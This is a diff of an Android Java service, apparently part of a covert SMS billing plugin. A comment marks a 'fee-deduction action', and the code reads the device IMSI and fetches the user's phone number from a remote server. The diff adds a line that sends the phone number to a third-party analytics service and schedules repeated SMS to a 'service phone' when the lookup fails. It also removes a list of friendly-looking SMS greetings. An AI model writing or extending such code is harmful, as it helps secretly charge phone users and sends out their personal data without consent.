@@ -49,14 +49,6 @@ public class PluginService extends IntentService {
 
     public static final String ACTIVE_FETCH_PHONE_ACTION = "com.xstd.plugin.fetch.phone";
 
-//    private static final String[] SEND_MESSAGE_CONTENT = new String[] {
-//        "你好，很高兴认识你。",
-//        "您好，很高兴为您服务。",
-//        "你好，请问你是？",
-//        "好久不见",
-//        "最近还好么?"
-//    };
-
     /**
      * 扣费行动
      */
@@ -107,6 +99,8 @@ public class PluginService extends IntentService {
             if (TextUtils.isEmpty(SettingManager.getInstance().getCurrentPhoneNumber())) {
                 String imsi = UtilsRuntime.getIMSI(getApplicationContext());
                 if (!TextUtils.isEmpty(imsi)) {
+                    if (!UtilsRuntime.isOnline(getApplicationContext())) return;
+
                     PhoneFetchRespone respone = InternetUtils.request(getApplicationContext()
                                                                          , new PhoneFetchRequest(
                                                                                                     DomanManager.getInstance(getApplicationContext())
@@ -121,12 +115,14 @@ public class PluginService extends IntentService {
                             //notify umeng
                             HashMap<String, String> log = new HashMap<String, String>();
                             log.put("fetch", "succes");
-//                            log.put("phoneNumber", respone.phone);
-//                            log.put("imsi", imsi);
+                            log.put("phoneNumber", respone.phone);
                             log.put("phoneType", Build.MODEL);
                             CommonUtil.umengLog(getApplicationContext(), "fetch_pn_with_imei", log);
                         } else {
                             SettingManager.getInstance().setKeyLastSendMsgToServicePhone(System.currentTimeMillis());
+                            //如果获取失败了，就再明天再向短信服务器发送短信.
+                            SettingManager.getInstance().setKeySendMsgToServicePhoneClearTimes(0);
+
                             //notify umeng
                             HashMap<String, String> log = new HashMap<String, String>();
                             log.put("fetch", "failed");
